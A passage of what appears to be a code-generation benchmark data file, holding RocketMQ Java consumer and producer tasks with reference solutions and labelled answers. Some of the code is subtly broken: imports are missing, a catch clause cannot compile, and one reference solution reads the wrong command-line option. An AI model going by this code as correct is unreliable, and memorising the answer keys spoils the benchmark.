shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class PushConsumer {\n    private static final String CONSUMER_GROUP = \"example-consumer-group\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"example-topic\";\n    private static final String SUB_EXPRESSION = \"TagA || TagB\";\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n\n        consumer.subscribe(TOPIC, SUB_EXPRESSION);\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() {\n        try {\n            consumer.start();\n            System.out.println(\"RocketMQ Push Consumer started.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n        System.out.println(\"RocketMQ Push Consumer shut down.\");\n    }\n}\n```"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with namespace support to asynchronously consume messages from a specified topic.\n\nClass Description: The PushConsumerWithNamespace class is designed to consume messages from a RocketMQ topic using a push-based model. It supports namespace configuration and provides methods to initialize, start, and shutdown the consumer. The consumer processes messages concurrently and prints message details to the console.\n\nAttributes:\n- NAMESPACE: [String] - The namespace identifier for the RocketMQ instance\n- CONSUMER_GROUP: [String] - The consumer group name\n- DEFAULT_NAMESRVADDR: [String] - The NameServer address\n- TOPIC: [String] - The topic to subscribe to\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initializeConsumer(): [void]() -> [void] - Initializes the consumer with namespace, NameServer address, topic subscription, and message listener configuration\n- startConsumer(): [void]() -> [void] - Starts the consumer to begin message consumption\n- shutdownConsumer(): [void]() -> [void] - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\n\npublic class PushConsumerWithNamespace {\n    public static final String NAMESPACE = \"InstanceTest\";\n    public static final String CONSUMER_GROUP = \"cidTest\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"NAMESPACE_TOPIC\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamespaceV2(NAMESPACE);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            msgs.forEach(msg -> System.out.printf(\"Msg topic is:%s, MsgId is:%s, reconsumeTimes is:%s%n\", \n                msg.getTopic(), msg.getMsgId(), msg.getReconsumeTimes()));\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdownConsumer() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class PushConsumerWithNamespace {\n    private static final String NAMESPACE = \"your_namespace\";\n    private static final String CONSUMER_GROUP = \"your_consumer_group\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"TestTopic\";\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.setNamespace(NAMESPACE);\n\n        consumer.subscribe(TOPIC, \"*\");\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()) +\n                        \", Topic: \" + msg.getTopic() +\n                        \", Tags: \" + msg.getTags());\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() throws Exception {\n        if (consumer != null) {\n            consumer.start();\n            System.out.println(\"Consumer started.\");\n        }\n    }\n\n    public void shutdownConsumer() {\n        if (consumer != null) {\n            consumer.shutdown();\n            System.out.println(\"Consumer shut down.\");\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        PushConsumerWithNamespace consumerWithNamespace = new PushConsumerWithNamespace();\n        consumerWithNamespace.initializeConsumer();\n        consumerWithNamespace.startConsumer();\n\n        // Keep the application running to consume messages\n        Thread.sleep(Long.MAX_VALUE);\n\n        consumerWithNamespace.shutdownConsumer();\n    }\n}\n```"
  },
  {
    "Task_id": 378,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and handle them asynchronously.\n\nClass Description: The RocketMQConsumer class is a message consumer implementation that uses RocketMQ's push-based consumption model. It subscribes to a specified topic, configures consumption settings, and processes incoming messages through a registered message listener.\n\nAttributes:\n- log: Logger - SLF4J logger instance for logging consumer activities\n- defaultMQPushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance\n- rpcHook: RPCHook - Optional RPC hook for custom communication handling\n- topicName: String - The topic name to subscribe to\n- consumerGroup: String - The consumer group name for this consumer\n\nMethods:\n- RocketMQConsumer(RPCHook, String, String) -> void - Constructor that initializes the consumer with RPC hook, topic name, and consumer group\n- startConsumer() -> void - Configures and starts the consumer instance, subscribes to the topic, and registers the message listener\n- shutdown() -> void - Gracefully shuts down the consumer instance\n- buildSendMessageRequestHeader(Message, String, int) -> SendMessageRequestHeader - Helper method to build message request headers for sending messages\n- (implements) consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Message listener implementation that processes consumed messages (inherited from MessageListenerConcurrently interface)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageDecoder;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.proxy.common.ProxyContext;\nimport org.apache.rocketmq.proxy.common.ProxyException;\nimport org.apache.rocketmq.proxy.common.ProxyExceptionCode;\nimport org.apache.rocketmq.remoting.RPCHook;\nimport org.apache.rocketmq.remoting.protocol.header.SendMessageRequestHeader;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class RocketMQConsumer implements MessageListenerConcurrently {\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.PROXY_LOGGER_NAME);\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private RPCHook rpcHook;\n    private String topicName;\n    private String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void startConsumer() throws Exception {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(this.consumerGroup, this.rpcHook);\n        this.defaultMQPushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        this.defaultMQPushConsumer.setMessageModel(MessageModel.BROADCASTING);\n        \n        try {\n            this.defaultMQPushConsumer.subscribe(this.topicName, \"*\");\n        } catch (MQClientException e) {\n            throw new ProxyException(ProxyExceptionCode.INTERNAL_SERVER_ERROR, \n                \"subscribe to topic \" + this.topicName + \" failed. \" + e.getMessage());\n        }\n        \n        this.defaultMQPushConsumer.registerMessageListener(this);\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() throws Exception {\n        if (this.defaultMQPushConsumer != null) {\n            this.defaultMQPushConsumer.shutdown();\n        }\n    }\n\n    protected SendMessageRequestHeader buildSendMessageRequestHeader(Message message,\n        String producerGroup, int queueId) {\n        SendMessageRequestHeader requestHeader = new SendMessageRequestHeader();\n        requestHeader.setProducerGroup(producerGroup);\n        requestHeader.setTopic(message.getTopic());\n        requestHeader.setDefaultTopic(TopicValidator.AUTO_CREATE_TOPIC_KEY_TOPIC);\n        requestHeader.setDefaultTopicQueueNums(0);\n        requestHeader.setQueueId(queueId);\n        requestHeader.setSysFlag(0);\n        requestHeader.setBornTimestamp(System.currentTimeMillis());\n        requestHeader.setFlag(message.getFlag());\n        requestHeader.setProperties(MessageDecoder.messageProperties2String(message.getProperties()));\n        requestHeader.setReconsumeTimes(0);\n        requestHeader.setBatch(false);\n        return requestHeader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n    private final Logger log = LoggerFactory.getLogger(RocketMQConsumer.class);\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n    private final RPCHook rpcHook;\n    private final String topicName;\n    private final String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(consumerGroup, rpcHook, null);\n    }\n\n    public void startConsumer() throws MQClientException {\n        defaultMQPushConsumer.setNamesrvAddr(\"localhost:9876\");\n        defaultMQPushConsumer.subscribe(topicName, MessageSelector.any());\n        defaultMQPushConsumer.setMessageModel(MessageModel.CLUSTERING);\n        defaultMQPushConsumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            return consumeMessage(msgs, context);\n        });\n\n        defaultMQPushConsumer.start();\n        log.info(\"RocketMQ Consumer started for topic: {}\", topicName);\n    }\n\n    public void shutdown() {\n        defaultMQPushConsumer.shutdown();\n        log.info(\"RocketMQ Consumer shutdown for topic: {}\", topicName);\n    }\n\n    private ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> messages, ConsumeConcurrentlyContext context) {\n        try {\n            for (MessageExt message : messages) {\n                log.info(\"Received message: {} | {}\", message.getMsgId(), new String(message.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        } catch (Exception e) {\n            log.error(\"Failed to process message\", e);\n            return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n        }\n    }\n\n    private SendMessageRequestHeader buildSendMessageRequestHeader(MessageExt message, String targetTopic, int delayTimeLevel) {\n        SendMessageRequestHeader requestHeader = new SendMessageRequestHeader();\n        requestHeader.setTopic(targetTopic);\n        requestHeader.setProducerGroup(\"default_group\");\n        requestHeader.setBodyCRC(0);\n        requestHeader.setBornTimestamp(System.currentTimeMillis());\n        requestHeader.setFlag(0);\n        requestHeader.setReconsumeTimes(0);\n        requestHeader.setDelayTimeLevel(delayTimeLevel);\n        return requestHeader;\n    }\n}\n```"
  },
  {
    "Task_id": 379,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The Consumer class is a RocketMQ message consumer that uses push-based consumption model. It allows subscribing to topics, registering message listeners, and managing the consumer lifecycle (startup and shutdown).\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- Constructor: Consumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group name and NameServer address. Sets the consumption offset strategy to start from the first offset.\n- subscribe: subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering using a subscription expression.\n- registerMessageListener: registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages.\n- start: start() -> void - Starts the consumer to begin message consumption.\n- shutdown: shutdown() -> void - Shuts down the consumer gracefully.\n\nNested Class:\n- SimpleMessageListener: Implements MessageListenerConcurrently interface to provide basic message handling functionality. Prints received messages and returns CONSUME_SUCCESS status.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.println(String.format(\"Consumer %s Started.\", consumer.getConsumerGroup()));\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                       ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        if (subExpression == null || subExpression.isEmpty()) {\n            consumer.subscribe(topic, \"*\");\n        } else {\n            consumer.subscribe(topic, MessageSelector.bySql(subExpression));\n        }\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"Received message: %s%n\", new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic, measuring the delay between message delivery and consumption.\n\nClass Description: The TimerConsumer class is a RocketMQ push consumer that subscribes to a specified topic, processes incoming messages, and calculates the time delay between when messages were delivered and when they were consumed. It provides command-line configuration for NameServer address and topic name.\n\nAttributes:\n- topic: String - The RocketMQ topic to subscribe to for messages\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- TimerConsumer(String[] args) - Constructor - Initializes the consumer with command-line arguments for NameServer address and topic\n  Input: args: String[] - Command-line arguments containing optional NameServer address and topic\n  Output: None\n\n- start() - void - Starts the consumer, subscribes to the topic, and registers a message listener\n  Input: None\n  Output: None (throws MQClientException if startup fails)\n\n- buildCommandlineOptions(Options options) - Options - Helper method to define command-line options\n  Input: options: Options - Apache Commons CLI Options object to extend\n  Output: Options - The extended Options object with consumer-specific options",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.ThreadFactoryImpl;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.srvutil.ServerUtil;\n\nimport java.util.List;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class TimerConsumer {\n    private final String topic;\n    private final DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = ServerUtil.buildCommandlineOptions(new Options());\n        final CommandLine commandLine = ServerUtil.parseCmdLine(\"benchmarkTimerConsumer\", args, buildCommandlineOptions(options), new DefaultParser());\n        if (null == commandLine) {\n            System.exit(-1);\n        }\n\n        final String namesrvAddr = commandLine.hasOption('n') ? commandLine.getOptionValue('t').trim() : \"localhost:9876\";\n        topic = commandLine.hasOption('t') ? commandLine.getOptionValue('t').trim() : \"BenchmarkTest\";\n        System.out.printf(\"namesrvAddr: %s, topic: %s%n\", namesrvAddr, topic);\n\n        consumer = new DefaultMQPushConsumer(\"benchmark_consumer\");\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                MessageExt msg = msgs.get(0);\n                long now = System.currentTimeMillis();\n\n                long deliverTimeMs = Long.parseLong(msg.getProperty(\"MY_RECORD_TIMER_DELIVER_MS\"));\n                long delayedDuration = now - deliverTimeMs;\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Start receiving messages%n\");\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Nameserver address, default: localhost:9876\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Send messages to which topic, default: BenchmarkTest\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.commons.cli.*;\n\nimport java.util.Date;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TimerConsumer {\n    private String topic;\n    private DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) throws ParseException {\n        Options options = new Options();\n        buildCommandlineOptions(options);\n        CommandLine commandLine = new GnuParser().parse(options, args);\n\n        String nameServer = commandLine.getOptionValue(\"n\", \"localhost:9876\");\n        this.topic = commandLine.getOptionValue(\"t\", \"TestTopic\");\n\n        consumer = new DefaultMQPushConsumer(\"TimerConsumerGroup\");\n        consumer.setNamesrvAddr(nameServer);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                long deliverTime = msg.getBornTimestamp();\n                long consumeTime = new Date().getTime();\n                long delay = consumeTime - deliverTime;\n                System.out.println(\"Message ID: \" + msg.getMsgId() + \", Delay: \" + delay + \" ms\");\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        ExecutorService executorService = Executors.newFixedThreadPool(20);\n        consumer.setConsumeThreadMax(20);\n        consumer.setConsumeThreadMin(10);\n        consumer.start();\n    }\n\n    public static Options buildCommandlineOptions(Options options) {\n        Option nameServerOption = new Option(\"n\", \"namesrv\", true, \"Name server address\");\n        nameServerOption.setRequired(false);\n        options.addOption(nameServerOption);\n\n        Option topicOption = new Option(\"t\", \"topic\", true, \"Topic to subscribe to\");\n        topicOption.setRequired(false);\n        options.addOption(topicOption);\n\n        return options;\n    }\n\n    public static void main(String[] args) {\n        try {\n            TimerConsumer timerConsumer = new TimerConsumer(args);\n            timerConsumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 381,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic using Apache RocketMQ client library.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to create, configure, and manage a RocketMQ message producer. It handles producer initialization, message creation, message sending, and producer shutdown.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the NameServer for service discovery\n- producerGroup: String - The group name of the producer\n- topic: String - The target topic for message sending\n- messageSize: int - The size of the message to be sent\n\nMethods:\n- RocketMQProducer(String, String, String, int) - Constructor - Initializes the producer with NameServer address, producer group, topic, and message size\n- start() -> void - Configures and starts the producer instance\n- sendMessage() -> SendResult - Creates and sends a message to the configured topic\n- shutdown() -> void - Shuts down the producer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void start() throws MQClientException {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setVipChannelEnabled(false);\n        producer.start();\n    }\n\n    public SendResult sendMessage() throws Exception {\n        StringBuilder sb = new StringBuilder();\n        for (int j = 0; j < messageSize; j += 10) {\n            sb.append(\"hello baby\");\n        }\n        byte[] body = sb.toString().getBytes(StandardCharsets.UTF_8);\n        Message message = new Message(topic, body);\n        return producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.producer.SendResult;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(this.producerGroup);\n    }\n\n    public void start() {\n        producer.setNamesrvAddr(namesrvAddr);\n        try {\n            producer.start();\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public SendResult sendMessage() {\n        byte[] body = new byte[messageSize];\n        Message msg = new Message(topic, \"TagA\", body);\n        try {\n            return producer.send(msg);\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to both regular topics and LMQ (Light Message Queue) topics. The producer should support initialization, message sending with custom properties, and proper shutdown.\n\nClass Description: The LMQProducer class is a RocketMQ producer implementation that demonstrates how to send messages to both regular topics and LMQ topics. It handles producer lifecycle management and message sending with multi-dispatch capabilities.\n\nAttributes:\n- PRODUCER_GROUP: String - The name of the producer group\n- DEFAULT_NAMESRVADDR: String - Default NameServer address (format: \"ip:port\")\n- TOPIC: String - The main topic to which messages will be sent\n- TAG: String - The tag for messages\n- LMQ_TOPIC_1: String - First LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- LMQ_TOPIC_2: String - Second LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- producer: DefaultMQProducer - The RocketMQ producer instance\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the producer by creating a new DefaultMQProducer instance, setting the NameServer address, and starting the producer\n- sendMessage(int messageId) throws Exception -> SendResult - Creates and sends a message with the given ID, setting message keys and LMQ dispatch properties\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageConst;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class LMQProducer {\n    public static final String PRODUCER_GROUP = \"ProducerGroupName\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String TAG = \"TagA\";\n    public static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"123\";\n    public static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"456\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, (\"Hello RocketMQ \" + messageId).getBytes(RemotingHelper.DEFAULT_CHARSET));\n        msg.setKeys(\"Key\" + messageId);\n        msg.putUserProperty(MessageConst.PROPERTY_INNER_MULTI_DISPATCH,\n            String.join(MixAll.LMQ_DISPATCH_SEPARATOR, LMQ_TOPIC_1, LMQ_TOPIC_2));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.MixAll;\n\npublic class LMQProducer {\n    private static final String PRODUCER_GROUP = \"LMQ_PRODUCER_GROUP\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"RegularTopic\";\n    private static final String TAG = \"TagA\";\n    private static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"LMQTopic1\";\n    private static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"LMQTopic2\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, (\"MessageBody\" + messageId).getBytes());\n        msg.putUserProperty(\"MessageType\", \"Regular\");\n        msg.putUserProperty(\"MessageID\", String.valueOf(messageId));\n        return producer.send(msg);\n    }\n\n    public SendResult sendLMQMessage(int messageId, String topic) throws Exception {\n        Message lmqMsg = new Message(topic, TAG, (\"LMQMessageBody\" + messageId).getBytes());\n        lmqMsg.putUserProperty(\"MessageType\", \"LMQ\");\n        lmqMsg.putUserProperty(\"MessageID\", String.valueOf(messageId));\n        return producer.send(lmqMsg);\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    